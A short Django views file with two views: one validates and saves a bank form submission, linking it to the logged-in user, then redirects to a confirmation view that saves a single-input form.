from django.shortcuts import render, redirect
from django.http import HttpResponse
from .forms import BankForm, SingleInputForm
from .models import BankFormSubmission


def form(request):
    if request.method == 'POST':
        form = BankForm(request.POST)
        if form.is_valid():
            # Save all form data to the database
            submission = form.save(commit=False)  # Create an instance without saving to the database
            if request.user.is_authenticated:
                submission.user = request.user  # Associate the submission with the authenticated user
            submission.save()  # Save the instance to the database
            return redirect('confirm')  # Redirect to the confirm view
        else:
            return HttpResponse("Invalid data submitted!")  # Handle invalid form data
    else:
        form = BankForm()
    
    return render(request, 'wform/form.html', {'form': form})


from django.shortcuts import render, redirect
from .forms import SingleInputForm

def confirm(request):
    if request.method == 'POST':
        form = SingleInputForm(request.POST)
        if form.is_valid():
            form.save()  # Save input to the database
    else:
        form = SingleInputForm()

    return render(request, 'wform/confirm.html', {'form': form})
